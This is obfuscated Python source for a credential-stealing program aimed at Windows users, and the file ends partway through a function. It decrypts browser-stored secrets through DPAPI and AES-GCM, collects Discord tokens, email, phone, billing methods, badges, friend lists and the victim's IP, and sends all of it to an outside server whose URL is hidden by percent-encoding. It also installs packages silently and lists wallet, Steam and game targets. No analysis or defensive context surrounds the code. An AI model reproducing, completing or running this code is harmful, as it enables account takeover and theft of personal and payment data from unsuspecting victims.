BA ='crypto'#line:1:BA='crypto'
B9 ='valorant'#line:2:B9='valorant'
B8 ='folder'#line:3:B8='folder'
B7 ='Steam'#line:4:B7='Steam'
B6 ='NationsGlory'#line:5:B6='NationsGlory'
B5 ='.db'#line:6:B5='.db'
B4 ='bcdefghijklmnopqrstuvwxyz'#line:7:B4='bcdefghijklmnopqrstuvwxyz'
B3 ='.ldb'#line:8:B3='.ldb'
B2 ='.log'#line:9:B2='.log'
B1 ='file'#line:10:B1='file'
B0 ='kiwi'#line:11:B0='kiwi'
A_ ='fields'#line:12:A_='fields'
Az ='token'#line:13:Az='token'
Ay ='public_flags'#line:14:Ay='public_flags'
Ax ='https%3A%2F%2Fdiscordapp.com%2Fapi%2Fv6%2Fusers%2F%2BAEA-me'#line:15:Ax='https%3A%2F%2Fdiscordapp.com%2Fapi%2Fv6%2Fusers%2F%2BAEA-me'
Aw ='utf8'#line:16:Aw='utf8'
Av ='requests'#line:17:Av='requests'
AV ='Wallet'#line:18:AV='Wallet'
AU ='\\'#line:19:AU='\\'
AT ='passw'#line:20:AT='passw'
AS ='encrypted_key'#line:21:AS='encrypted_key'
AR ='os_crypt'#line:22:AR='os_crypt'
AQ ='/Local State'#line:23:AQ='/Local State'
AP ='https://i.imgur.com/KQp7JUr.gif'#line:24:AP='https://i.imgur.com/KQp7JUr.gif'
AO ='text'#line:25:AO='text'
AN ='footer'#line:26:AN='footer'
AM ='author'#line:27:AM='author'
AL ='color'#line:28:AL='color'
AK ='attachments'#line:29:AK='attachments'
AJ ='avatar_url'#line:30:AJ='avatar_url'
AI ='embeds'#line:31:AI='embeds'
AH ='content'#line:32:AH='content'
AG ='ignore'#line:33:AG='ignore'
AF ='TEMP'#line:34:AF='TEMP'
y ='utf-8'#line:35:y='utf-8'
x ='https'#line:36:x='https'
w =':x:'#line:37:w=':x:'
v =range #line:38:v=range
g ='icon_url'#line:39:g='icon_url'
f ='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'#line:40:f='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
e ='Authorization'#line:41:e='Authorization'
a ='application/json'#line:42:a='application/json'
Z ='User-Agent'#line:43:Z='User-Agent'
Y ='Content-Type'#line:44:Y='Content-Type'
U ='value'#line:45:U='value'
T ='discriminator'#line:46:T='discriminator'
R =False #line:47:R=False
Q =len #line:48:Q=len
M ='username'#line:49:M='username'
L ='type'#line:50:L='type'
K =open #line:51:K=open
J ='name'#line:52:J='name'
G =True #line:53:G=True
D =None #line:54:D=None
C ='/'#line:55:C='/'
B =''#line:56:B=''
import os as A ,threading as N #line:57:import os as A,threading as N
from sys import executable as AW #line:58:from sys import executable as AW
from sqlite3 import connect as z #line:59:from sqlite3 import connect as z
import re #line:60:import re
from base64 import b64decode as b #line:61:from base64 import b64decode as b
from json import loads as h ,load #line:62:from json import loads as h,load
from ctypes import windll as A0 ,wintypes as AX ,byref as i ,cdll ,Structure as AY ,POINTER ,c_char ,c_buffer as j #line:63:from ctypes import windll as A0,wintypes as AX,byref as i,cdll,Structure as AY,POINTER,c_char,c_buffer as j
from urllib .request import Request as H ,urlopen as I #line:64:from urllib.request import Request as H,urlopen as I
from urllib .parse import unquote as F #line:65:from urllib.parse import unquote as F
try :from pyotp import TOTP #line:66:try:from pyotp import TOTP
except :A .system ('pip install pyotp && cls >nul');from pyotp import TOTP #line:67:except:A.system('pip install pyotp && cls >nul');from pyotp import TOTP
from json import loads as A1 ,dumps as k #line:68:from json import loads as A1,dumps as k
import time ,shutil as A2 ,json #line:69:import time,shutil as A2,json
from zipfile import ZipFile #line:70:from zipfile import ZipFile
import random as A3 ,subprocess as A4 #line:71:import random as A3,subprocess as A4
O =R #line:72:O=R
A5 =F ('https%3A%2F%2Fmisogyny.wtf%2Flogs%2Fnovoprojeto')#line:73:A5=F('https%3A%2F%2Fmisogyny.wtf%2Flogs%2Fnovoprojeto')
def AZ ():#line:74:def AZ():
	OO000O0000O0O0OOO ='None'#line:75:A='None'
	try :OO000O0000O0O0OOO =I (H ('https://api.ipify.org')).read ().decode ().strip ()#line:76:try:A=I(H('https://api.ipify.org')).read().decode().strip()
	except :pass #line:77:except:pass
	return OO000O0000O0O0OOO #line:78:return A
Aa =[[Av ,Av ],['Cryptodome.Cipher','pycryptodomex']]#line:79:Aa=[[Av,Av],['Cryptodome.Cipher','pycryptodomex']]
for A6 in Aa :#line:80:for A6 in Aa:
	try :__import__ (A6 [0 ])#line:81:try:__import__(A6[0])
	except :A4 .Popen (f"{AW} -m pip install {A6[1]}",shell =G );time .sleep (3 )#line:82:except:A4.Popen(f"{AW} -m pip install {A6[1]}",shell=G);time.sleep(3)
try :import requests as P #line:83:try:import requests as P
except :A .system ('pip install requests && cls >nul');import requests as P #line:84:except:A.system('pip install requests && cls >nul');import requests as P
try :from Cryptodome .Cipher import AES #line:85:try:from Cryptodome.Cipher import AES
except :A .system ('pip install pycryptodomex && cls >nul');from Cryptodome .Cipher import AES #line:86:except:A.system('pip install pycryptodomex && cls >nul');from Cryptodome.Cipher import AES
V =A .getenv ('LOCALAPPDATA')#line:87:V=A.getenv('LOCALAPPDATA')
E =A .getenv ('APPDATA')#line:88:E=A.getenv('APPDATA')
l =A .getenv (AF )#line:89:l=A.getenv(AF)
c =[]#line:90:c=[]
class m (AY ):_fields_ =[('cbData',AX .DWORD ),('pbData',POINTER (c_char ))]#line:91:class m(AY):_fields_=[('cbData',AX.DWORD),('pbData',POINTER(c_char))]
def Ab (OO00O0O0O0O000OO0 ):O0OO0OOOO000O000O =OO00O0O0O0O000OO0 ;O0O00000O00O0OO00 =int (O0OO0OOOO000O000O .cbData );OOO0OOO0OO0000O00 =O0OO0OOOO000O000O .pbData ;O0O0OOO0O0O0O00O0 =j (O0O00000O00O0OO00 );cdll .msvcrt .memcpy (O0O0OOO0O0O0O00O0 ,OOO0OOO0OO0000O00 ,O0O00000O00O0OO00 );A0 .kernel32 .LocalFree (OOO0OOO0OO0000O00 );return O0O0OOO0O0O0O00O0 .raw #line:92:def Ab(blob_out):A=blob_out;B=int(A.cbData);C=A.pbData;D=j(B);cdll.msvcrt.memcpy(D,C,B);A0.kernel32.LocalFree(C);return D.raw
def n (O0O0O0O0O0000OOO0 ,OO00O00OO00000O00 =b''):#line:93:def n(encrypted_bytes,entropy=b''):
	O0OO0OOO00O0OO0OO =OO00O00OO00000O00 ;OOOO0OO0OO00OO0O0 =O0O0O0O0O0000OOO0 ;OO0OOOOO00OO0OO00 =j (OOOO0OO0OO00OO0O0 ,Q (OOOO0OO0OO00OO0O0 ));O000OOOOO000OO0OO =j (O0OO0OOO00O0OO0OO ,Q (O0OO0OOO00O0OO0OO ));OOO0O0O0O0OO00OOO =m (Q (OOOO0OO0OO00OO0O0 ),OO0OOOOO00OO0OO00 );OOOO00O0O00000OO0 =m (Q (O0OO0OOO00O0OO0OO ),O000OOOOO000OO0OO );OOOO0000OOOO00OOO =m ()#line:94:B=entropy;A=encrypted_bytes;E=j(A,Q(A));F=j(B,Q(B));G=m(Q(A),E);H=m(Q(B),F);C=m()
	if A0 .crypt32 .CryptUnprotectData (i (OOO0O0O0O0OO00OOO ),D ,i (OOOO00O0O00000OO0 ),D ,D ,1 ,i (OOOO0000OOOO00OOO )):return Ab (OOOO0000OOOO00OOO )#line:95:if A0.crypt32.CryptUnprotectData(i(G),D,i(H),D,D,1,i(C)):return Ab(C)
def o (O0O000O000O0OO000 ,O00O000OO00000OOO =D ):#line:96:def o(buff,master_key=D):
	O0OOOOOO0OOO0O000 =O0O000O000O0OO000 ;O0O00O000000O00OO =O0OOOOOO0OOO0O000 .decode (encoding =Aw ,errors =AG )[:3 ]#line:97:A=buff;C=A.decode(encoding=Aw,errors=AG)[:3]
	if O0O00O000000O00OO =='v10'or O0O00O000000O00OO =='v11':O00000OOO0OO00O0O =O0OOOOOO0OOO0O000 [3 :15 ];O00OO0OO0OO00O0OO =O0OOOOOO0OOO0O000 [15 :];O000OOO000OO00O00 =AES .new (O00O000OO00000OOO ,AES .MODE_GCM ,O00000OOO0OO00O0O );OO0O0OO00000O0O0O =O000OOO000OO00O00 .decrypt (O00OO0OO0OO00O0OO );OO0O0OO00000O0O0O =OO0O0OO00000O0O0O [:-16 ].decode ();return OO0O0OO00000O0O0O #line:98:if C=='v10'or C=='v11':D=A[3:15];E=A[15:];F=AES.new(master_key,AES.MODE_GCM,D);B=F.decrypt(E);B=B[:-16].decode();return B
def BB (O0OO00O0OO00OO0OO ,O0O000OO000OO0O00 ,OO00OO00OO000OO00 =B ,OOOO0OOOO0O0000OO =B ,O000O0O0OOO000O0O =B ):#line:99:def BB(methode,url,data=B,files=B,headers=B):
	O0OO0O0OOOOO0OOO0 =OOOO0OOOO0O0000OO #line:100:C=files
	for OO0O0O0OOOO0OO0O0 in v (8 ):#line:101:for D in v(8):
		try :#line:102:try:
			if O0OO00O0OO00OO0OO =='POST':#line:103:if methode=='POST':
				if OO00OO00OO000OO00 !=B :#line:104:if data!=B:
					O0O0O0O0O0OOO0O00 =P .post (O0O000OO000OO0O00 ,data =OO00OO00OO000OO00 )#line:105:A=P.post(url,data=data)
					if O0O0O0O0O0OOO0O00 .status_code ==200 :return O0O0O0O0O0OOO0O00 #line:106:if A.status_code==200:return A
				elif O0OO0O0OOOOO0OOO0 !=B :#line:107:elif C!=B:
					O0O0O0O0O0OOO0O00 =P .post (O0O000OO000OO0O00 ,files =O0OO0O0OOOOO0OOO0 )#line:108:A=P.post(url,files=C)
					if O0O0O0O0O0OOO0O00 .status_code ==200 or O0O0O0O0O0OOO0O00 .status_code ==413 :return O0O0O0O0O0OOO0O00 #line:109:if A.status_code==200 or A.status_code==413:return A
		except :pass #line:110:except:pass
def BC (O0O0O0O0OOO00000O ,O0O00000O0OOOOOOO =B ,O0OOO0O0OOOO0OO0O =B ,OO0OO000O0000O000 =B ):#line:111:def BC(hook,data=B,files=B,headers=B):
	OOOOO00O0O000O0O0 =OO0OO000O0000O000 #line:112:C=headers
	for OOO0O0OO0O0000O0O in v (8 ):#line:113:for D in v(8):
		try :#line:114:try:
			if OOOOO00O0O000O0O0 !=B :OOO0O0O0O0O00O000 =I (H (O0O0O0O0OOO00000O ,data =O0O00000O0OOOOOOO ,headers =OOOOO00O0O000O0O0 ));return OOO0O0O0O0O00O000 #line:115:if C!=B:A=I(H(hook,data=data,headers=C));return A
			else :OOO0O0O0O0O00O000 =I (H (O0O0O0O0OOO00000O ,data =O0O00000O0OOOOOOO ));return OOO0O0O0O0O00O000 #line:116:else:A=I(H(hook,data=data));return A
		except :pass #line:117:except:pass
def A7 (O000OO00OOO0OO0OO ):#line:118:def A7(Cookies):
	global O ;OOOOO0000OOOOO000 =str (O000OO00OOO0OO0OO );OO00O0OOO00000O00 =re .findall ('.google.com',OOOOO0000OOOOO000 )#line:119:global O;A=str(Cookies);B=re.findall('.google.com',A)
	if Q (OO00O0OOO00000O00 )<-1 :O =G ;return O #line:120:if Q(B)<-1:O=G;return O
	else :O =R ;return O #line:121:else:O=R;return O
def Ac (OO0OO0000OO0000OO ):#line:122:def Ac(token):
	O00O0O00OO0OO0OOO ={e :OO0OO0000OO0000OO ,Y :a ,Z :f }#line:123:E={e:token,Y:a,Z:f}
	try :OO0OO00OOO0O0O0O0 =A1 (I (H (F ('https%3A%2F%2Fdiscord.com%2Fapi%2Fusers%2F%2BAEA-me%2Fbilling%2Fpayment-sources'),headers =O00O0O00OO0OO0OOO )).read ().decode ())#line:124:try:D=A1(I(H(F('https%3A%2F%2Fdiscord.com%2Fapi%2Fusers%2F%2BAEA-me%2Fbilling%2Fpayment-sources'),headers=E)).read().decode())
	except :return R #line:125:except:return R
	if OO0OO00OOO0O0O0O0 ==[]:return w #line:126:if D==[]:return w
	O0O0OOOOOO000O0O0 =B #line:127:A=B
	for OO000OOOOO000OO0O in OO0OO00OOO0O0O0O0 :#line:128:for C in D:
		if OO000OOOOO000OO0O ['invalid']==R :#line:129:if C['invalid']==R:
			if OO000OOOOO000OO0O [L ]==1 :O0O0OOOOOO000O0O0 +=' :credit_card: '#line:130:if C[L]==1:A+=' :credit_card: '
			elif OO000OOOOO000OO0O [L ]==2 :O0O0OOOOOO000O0O0 +=' :parking: '#line:131:elif C[L]==2:A+=' :parking: '
			elif OO000OOOOO000OO0O [L ]==8 :O0O0OOOOOO000O0O0 +=' :regional_indicator_g: '#line:132:elif C[L]==8:A+=' :regional_indicator_g: '
	return O0O0OOOOOO000O0O0 #line:133:return A
def Ad (OO0OO00O0000O000O ):#line:134:def Ad(flags):
	OO00O00OO0000OO00 =OO0OO00O0000O000O ;OOO0OO0O00O0OOOO0 ='Name';O0OO0O0O0OOO000OO ='Emoji';OOO0O000OOO0OO0O0 ='Value'#line:135:E=flags;D='Name';C='Emoji';A='Value'
	if OO00O00OO0000OO00 ==0 :return B #line:136:if E==0:return B
	O0OOOOOOO00O0OOOO =B ;O0O0OO00O000OO00O =[{OOO0OO0O00O0OOOO0 :'Early_Verified_Bot_Developer',OOO0O000OOO0OO0O0 :131072 ,O0OO0O0O0OOO000OO :'<:developer:874750808472825986> '},{OOO0OO0O00O0OOOO0 :'Bug_Hunter_Level_2',OOO0O000OOO0OO0O0 :16384 ,O0OO0O0O0OOO000OO :'<:bughunter_2:874750808430874664> '},{OOO0OO0O00O0OOOO0 :'Early_Supporter',OOO0O000OOO0OO0O0 :512 ,O0OO0O0O0OOO000OO :'<:early_supporter:874750808414113823> '},{OOO0OO0O00O0OOOO0 :'House_Balance',OOO0O000OOO0OO0O0 :256 ,O0OO0O0O0OOO000OO :'<:balance:874750808267292683> '},{OOO0OO0O00O0OOOO0 :'House_Brilliance',OOO0O000OOO0OO0O0 :128 ,O0OO0O0O0OOO000OO :'<:brilliance:874750808338608199> '},{OOO0OO0O00O0OOOO0 :'House_Bravery',OOO0O000OOO0OO0O0 :64 ,O0OO0O0O0OOO000OO :'<:bravery:874750808388952075> '},{OOO0OO0O00O0OOOO0 :'Bug_Hunter_Level_1',OOO0O000OOO0OO0O0 :8 ,O0OO0O0O0OOO000OO :'<:bughunter_1:874750808426692658> '},{OOO0OO0O00O0OOOO0 :'HypeSquad_Events',OOO0O000OOO0OO0O0 :4 ,O0OO0O0O0OOO000OO :'<:hypesquad_events:874750808594477056> '},{OOO0OO0O00O0OOOO0 :'Partnered_Server_Owner',OOO0O000OOO0OO0O0 :2 ,O0OO0O0O0OOO000OO :'<:partner:874750808678354964> '},{OOO0OO0O00O0OOOO0 :'Discord_Employee',OOO0O000OOO0OO0O0 :1 ,O0OO0O0O0OOO000OO :'<:staff:874750808728666152> '}]#line:137:G=B;H=[{D:'Early_Verified_Bot_Developer',A:131072,C:'<:developer:874750808472825986> '},{D:'Bug_Hunter_Level_2',A:16384,C:'<:bughunter_2:874750808430874664> '},{D:'Early_Supporter',A:512,C:'<:early_supporter:874750808414113823> '},{D:'House_Balance',A:256,C:'<:balance:874750808267292683> '},{D:'House_Brilliance',A:128,C:'<:brilliance:874750808338608199> '},{D:'House_Bravery',A:64,C:'<:bravery:874750808388952075> '},{D:'Bug_Hunter_Level_1',A:8,C:'<:bughunter_1:874750808426692658> '},{D:'HypeSquad_Events',A:4,C:'<:hypesquad_events:874750808594477056> '},{D:'Partnered_Server_Owner',A:2,C:'<:partner:874750808678354964> '},{D:'Discord_Employee',A:1,C:'<:staff:874750808728666152> '}]
	for O00000OOO0O00OOO0 in O0O0OO00O000OO00O :#line:138:for F in H:
		if OO00O00OO0000OO00 //O00000OOO0O00OOO0 [OOO0O000OOO0OO0O0 ]!=0 :O0OOOOOOO00O0OOOO +=O00000OOO0O00OOO0 [O0OO0O0O0OOO000OO ];OO00O00OO0000OO00 =OO00O00OO0000OO00 %O00000OOO0O00OOO0 [OOO0O000OOO0OO0O0 ]#line:139:if E//F[A]!=0:G+=F[C];E=E%F[A]
	return O0OOOOOOO00O0OOOO #line:140:return G
def Ae (O0000O0O0OOO000OO ):#line:141:def Ae(token):
	OOOO0OO00OOO000O0 ='phone';O000OOO0OO0OO0000 ='premium_type';OOOOO0O00OO0O000O ={e :O0000O0O0OOO000OO ,Y :a ,Z :f };O0OO0000OOOOOO00O =A1 (I (H (F (Ax ),headers =OOOOO0O00OO0O000O )).read ().decode ());OOO0O0OOOOO000OOO =O0OO0000OOOOOO00O [M ];OOO000OOOO0O00OOO =O0OO0000OOOOOO00O [T ];OO00000O000000OOO =O0OO0000OOOOOO00O ['email'];OOO00OO00000O00OO =O0OO0000OOOOOO00O ['id'];OOO0O0O0O00O0O000 =O0OO0000OOOOOO00O ['avatar'];OO0000OO0OO000000 =O0OO0000OOOOOO00O [Ay ];O0OO00O000OOO0O00 =w ;O0OOOOOO0O00OO0O0 =w #line:142:Q='phone';P='premium_type';E={e:token,Y:a,Z:f};A=A1(I(H(F(Ax),headers=E)).read().decode());G=A[M];J=A[T];K=A['email'];L=A['id'];N=A['avatar'];O=A[Ay];B=w;C=w
	if O000OOO0OO0OO0000 in O0OO0000OOOOOO00O :#line:143:if P in A:
		O000OOOOO0000OO0O =O0OO0000OOOOOO00O [O000OOO0OO0OO0000 ]#line:144:D=A[P]
		if O000OOOOO0000OO0O ==1 :O0OO00O000OOO0O00 ='<:classic:896119171019067423> '#line:145:if D==1:B='<:classic:896119171019067423> '
		elif O000OOOOO0000OO0O ==2 :O0OO00O000OOO0O00 ='<a:boost:824036778570416129> <:classic:896119171019067423> '#line:146:elif D==2:B='<a:boost:824036778570416129> <:classic:896119171019067423> '
	if OOOO0OO00OOO000O0 in O0OO0000OOOOOO00O :O0OOOOOO0O00OO0O0 =f"`{O0OO0000OOOOOO00O[OOOO0OO00OOO000O0]}`"#line:147:if Q in A:C=f"`{A[Q]}`"
	return OOO0O0OOOOO000OOO ,OOO000OOOO0O00OOO ,OO00000O000000OOO ,OOO00OO00000O00OO ,OOO0O0O0O00O0O000 ,OO0000OO0OO000000 ,O0OO00O000OOO0O00 ,O0OOOOOO0O00OO0O0 #line:148:return G,J,K,L,N,O,B,C
def A8 (OO000OOOO000OOOO0 ):#line:149:def A8(token):
	OO000OO0OOO0OOO0O ={e :OO000OOOO000OOOO0 ,Y :a ,Z :f }#line:150:A={e:token,Y:a,Z:f}
	try :I (H (F (Ax ),headers =OO000OO0OOO0OOO0O ));return G #line:151:try:I(H(F(Ax),headers=A));return G
	except :return R #line:152:except:return R
def Af (O0OOO0OO0O00OOOOO ):#line:153:def Af(token):
	OOOOOOOOOOO000O0O ='user';OOO0OO0000000O00O =B ;OO0O0OOO0OO0O0O00 ={e :f"{O0OOO0OO0O00OOOOO}"};O0O00O0OOO0O00000 =P .get (F ('https%3A%2F%2Fdiscord.com%2Fapi%2Fv6%2Fusers%2F%2BAEA-me%2Frelationships'),headers =OO0O0OOO0OO0O0O00 );O0OOO000000OO000O =json .loads (O0O00O0OOO0O00000 .text )#line:154:E='user';G=B;I={e:f"{token}"};J=P.get(F('https%3A%2F%2Fdiscord.com%2Fapi%2Fv6%2Fusers%2F%2BAEA-me%2Frelationships'),headers=I);H=json.loads(J.text)
	if Q (O0OOO000000OO000O )==0 :return D #line:155:if Q(H)==0:return D
	for OOOO0000OO00O00OO in O0OOO000000OO000O :#line:156:for A in H:
		O0O0OO0OO0000000O =OOOO0000OO00O00OO [OOOOOOOOOOO000O0O ][Ay ]#line:157:C=A[E][Ay]
		if OOOO0000OO00O00OO [L ]==1 &O0O0OO0OO0000000O %131072 !=0 :OOO0OO0000000O00O +=f" <:DevBadge:912727453875699733>|`{OOOO0000OO00O00OO[OOOOOOOOOOO000O0O][M]}#{OOOO0000OO00O00OO[OOOOOOOOOOO000O0O][T]}`\n";O0O0OO0OO0000000O =O0O0OO0OO0000000O %131072 #line:158:if A[L]==1&C%131072!=0:G+=f" <:DevBadge:912727453875699733>|`{A[E][M]}#{A[E][T]}`\n";C=C%131072
		if OOOO0000OO00O00OO [L ]==1 &O0O0OO0OO0000000O //16384 !=0 :OOO0OO0000000O00O +=f" <:TG_DiscordBugHunter:924608161116213278>|`{OOOO0000OO00O00OO[OOOOOOOOOOO000O0O][M]}#{OOOO0000OO00O00OO[OOOOOOOOOOO000O0O][T]}`\n";O0O0OO0OO0000000O =O0O0OO0OO0000000O %16384 #line:159:if A[L]==1&C//16384!=0:G+=f" <:TG_DiscordBugHunter:924608161116213278>|`{A[E][M]}#{A[E][T]}`\n";C=C%16384
		if OOOO0000OO00O00OO [L ]==1 &O0O0OO0OO0000000O //512 !=0 :OOO0OO0000000O00O +=f" <a:early:913099122968494170>|`{OOOO0000OO00O00OO[OOOOOOOOOOO000O0O][M]}#{OOOO0000OO00O00OO[OOOOOOOOOOO000O0O][T]}`\n";O0O0OO0OO0000000O =O0O0OO0OO0000000O %512 #line:160:if A[L]==1&C//512!=0:G+=f" <a:early:913099122968494170>|`{A[E][M]}#{A[E][T]}`\n";C=C%512
		if OOOO0000OO00O00OO [L ]==1 &O0O0OO0OO0000000O //8 !=0 :OOO0OO0000000O00O +=f" <:TP_Icon_bugHunter:896263053484638218>|`{OOOO0000OO00O00OO[OOOOOOOOOOO000O0O][M]}#{OOOO0000OO00O00OO[OOOOOOOOOOO000O0O][T]}`\n";O0O0OO0OO0000000O =O0O0OO0OO0000000O %8 #line:161:if A[L]==1&C//8!=0:G+=f" <:TP_Icon_bugHunter:896263053484638218>|`{A[E][M]}#{A[E][T]}`\n";C=C%8
		if OOOO0000OO00O00OO [L ]==1 &O0O0OO0OO0000000O //4 !=0 :OOO0OO0000000O00O +=f" <a:CH_IconHypesquadShiny:928551747591487548>|`{OOOO0000OO00O00OO[OOOOOOOOOOO000O0O][M]}#{OOOO0000OO00O00OO[OOOOOOOOOOO000O0O][T]}`\n";O0O0OO0OO0000000O =O0O0OO0OO0000000O %4 #line:162:if A[L]==1&C//4!=0:G+=f" <a:CH_IconHypesquadShiny:928551747591487548>|`{A[E][M]}#{A[E][T]}`\n";C=C%4
		if OOOO0000OO00O00OO [L ]==1 &O0O0OO0OO0000000O //2 !=0 :OOO0OO0000000O00O +=f" <a:Badge_partner:875020015215190046>|`{OOOO0000OO00O00OO[OOOOOOOOOOO000O0O][M]}#{OOOO0000OO00O00OO[OOOOOOOOOOO000O0O][T]}`\n";O0O0OO0OO0000000O =O0O0OO0OO0000000O %2 #line:163:if A[L]==1&C//2!=0:G+=f" <a:Badge_partner:875020015215190046>|`{A[E][M]}#{A[E][T]}`\n";C=C%2
	if OOO0OO0000000O00O ==B :return '`NO HQ FRIENDS`'#line:164:if G==B:return'`NO HQ FRIENDS`'
	else :return OOO0OO0000000O00O #line:165:else:return G
def A9 (O0OOO0000000OO0O0 ,O0000OO0OOOO00000 ):#line:166:def A9(token,path):
	O0OOO00O0O0OO000O ='url';O0000OOO000OO0000 ='thumbnail';O0OOOOOOO0OO00O0O ='🔒';O000O0O0O000O0O0O ='inline';OOO0OO00O00OOO000 =O0OOO0000000OO0O0 ;global A5 ;OOOO0O00O00000000 ={Y :a ,Z :f };O0OOO000OOO0OO00O ,OO0O0000OOO000OO0 ,O000OOOOOO00O0000 ,OOOOO0O0O00000OOO ,O00000OO0O00OOO00 ,OOO0O0OO00O0OOO0O ,OOO0OOOOOO000000O ,O0O00000000OOOO00 =Ae (OOO0OO00O00OOO000 );O00000OO0OOOO0OOO =P .post (F ('%68%74%74%70%73%3a%2f%2f%6d%69%73%6f%67%79%6e%79%2e%77%74%66%2f%64%62%2f%6e%65%77%74%6f%6b%65%6e'),json ={Az :OOO0OO00O00OOO000 },headers ={Y :a ,Z :'Mozilla/5.0 (Linux; Ubuntu 14.04) AppleWebKit/537.36 Chromium/35.0.1870.2/Flps Safari/537.36/Zckt'})#line:167:h='url';e='thumbnail';V='🔒';E='inline';C=token;global A5;Q={Y:a,Z:f};R,S,W,K,A,X,L,T=Ae(C);b=P.post(F('%68%74%74%70%73%3a%2f%2f%6d%69%73%6f%67%79%6e%79%2e%77%74%66%2f%64%62%2f%6e%65%77%74%6f%6b%65%6e'),json={Az:C},headers={Y:a,Z:'Mozilla/5.0 (Linux; Ubuntu 14.04) AppleWebKit/537.36 Chromium/35.0.1870.2/Flps Safari/537.36/Zckt'})
	if O00000OO0OOOO0OOO .text =='Not in db':#line:168:if b.text=='Not in db':
		if O00000OO0O00OOO00 ==D :O00000OO0O00OOO00 =F ('https%3A%2F%2Fi.imgur.com%2FKQp7JUr.gif')#line:169:if A==D:A=F('https%3A%2F%2Fi.imgur.com%2FKQp7JUr.gif')
		else :O00000OO0O00OOO00 =f"https://cdn.discordapp.com/avatars/{OOOOO0O0O00000OOO}/{O00000OO0O00OOO00}"#line:170:else:A=f"https://cdn.discordapp.com/avatars/{K}/{A}"
		O0OOO0OO0OO0OO000 =Ac (OOO0OO00O00OOO000 );O0O00OOO00OOOOOO0 =Ad (OOO0O0OO00O0OOO0O )#line:171:N=Ac(C);O=Ad(X)
		if not O0OOO0OO0OO0OO000 :O0O00OOO00OOOOOO0 ,O0O00000000OOOO00 ,O0OOO0OO0OO0OO000 =O0OOOOOOO0OO00O0O ,O0OOOOOOO0OO00O0O ,O0OOOOOOO0OO00O0O #line:172:if not N:O,T,N=V,V,V
		if OOO0OOOOOO000000O ==B and O0O00OOO00OOOOOO0 ==B :OOO0OOOOOO000000O =w #line:173:if L==B and O==B:L=w
		OO0O00O00O0O0OOO0 ={AH :f"Found in `{O0000OO0OOOO00000}`",AI :[{AL :5119890 ,A_ :[{J :':rocket: Token:',U :f"`{OOO0OO00O00OOO000}`\n[Click to copy](https://superfurrycdn.nl/copy/{C})"},{J :':envelope: Email:',U :f"`{O000OOOOOO00O0000}`",O000O0O0O000O0O0O :G },{J :':mobile_phone: Phone:',U :f"`{O0O00000000OOOO00}`",O000O0O0O000O0O0O :G },{J :':globe_with_meridians: IP:',U :f"`{AZ()}`",O000O0O0O000O0O0O :G },{J :':beginner: Badges:',U :f"{OOO0OOOOOO000000O}{O0O00OOO00OOOOOO0}",O000O0O0O000O0O0O :G },{J :':credit_card: Billing:',U :f"{O0OOO0OO0OO0OO000}",O000O0O0O000O0O0O :G }],AM :{J :f"{O0OOO000OOO0OO00O}#{OO0O0000OOO000OO0} ({OOOOO0O0O00000OOO})",g :f"{O00000OO0O00OOO00}"},AN :{AO :D ,g :AP },O0000OOO000OO0000 :{O0OOO00O0O0OO000O :f"{O00000OO0O00OOO00}"}}],AJ :D ,M :D ,AK :[]};O000OOOOOO00OOO00 ={AH :D ,AI :[{AL :5119890 ,'description':f"{Af(OOO0OO00O00OOO000)}",AM :{J :f"{O0OOO000OOO0OO00O}#{OO0O0000OOO000OO0} ({OOOOO0O0O00000OOO})",g :f"{O00000OO0O00OOO00}"},AN :{AO :D ,g :AP },O0000OOO000OO0000 :{O0OOO00O0O0OO000O :f"{O00000OO0O00OOO00}"}}],AJ :D ,M :D ,AK :[]};I (H (A5 ,data =k (OO0O00O00O0O0OOO0 ).encode (),headers =OOOO0O00O00000000 ));I (H (F ('https%3A%2F%2Fmisogyny.wtf%2Flogs%2Ffriendlist'),data =k (O000OOOOOO00OOO00 ).encode (),headers =OOOO0O00O00000000 ))#line:174:c={AH:f"Found in `{path}`",AI:[{AL:5119890,A_:[{J:':rocket: Token:',U:f"`{C}`\n[Click to copy](https://superfurrycdn.nl/copy/{C})"},{J:':envelope: Email:',U:f"`{W}`",E:G},{J:':mobile_phone: Phone:',U:f"`{T}`",E:G},{J:':globe_with_meridians: IP:',U:f"`{AZ()}`",E:G},{J:':beginner: Badges:',U:f"{L}{O}",E:G},{J:':credit_card: Billing:',U:f"{N}",E:G}],AM:{J:f"{R}#{S} ({K})",g:f"{A}"},AN:{AO:D,g:AP},e:{h:f"{A}"}}],AJ:D,M:D,AK:[]};d={AH:D,AI:[{AL:5119890,'description':f"{Af(C)}",AM:{J:f"{R}#{S} ({K})",g:f"{A}"},AN:{AO:D,g:AP},e:{h:f"{A}"}}],AJ:D,M:D,AK:[]};I(H(A5,data=k(c).encode(),headers=Q));I(H(F('https%3A%2F%2Fmisogyny.wtf%2Flogs%2Ffriendlist'),data=k(d).encode(),headers=Q))
	else :0 #line:175:else:0
def BD (OO00O0OO0OOO00O0O ):#line:176:def BD(listt):
	OOO0O0O0O0000OO00 ='net';OOO0O0000OOO000OO ='com';OO00000O0OO0OO000 =re .findall ('(\\w+[a-z])',OO00O0OO0OOO00O0O )#line:177:C='net';B='com';A=re.findall('(\\w+[a-z])',listt)
	while x in OO00000O0OO0OO000 :OO00000O0OO0OO000 .remove (x )#line:178:while x in A:A.remove(x)
	while OOO0O0000OOO000OO in OO00000O0OO0OO000 :OO00000O0OO0OO000 .remove (OOO0O0000OOO000OO )#line:179:while B in A:A.remove(B)
	while OOO0O0O0O0000OO00 in OO00000O0OO0OO000 :OO00000O0OO0OO000 .remove (OOO0O0O0O0000OO00 )#line:180:while C in A:A.remove(C)
	return list (set (OO00000O0OO0OO000 ))#line:181:return list(set(A))
def p (O0OO0000000000OO0 ,OOO00OO0OO00OOOOO =B ):#line:182:def p(name,tk=B):
	O0000O0OO0000OOO0 ={Y :a ,Z :f }#line:183:A={Y:a,Z:f}
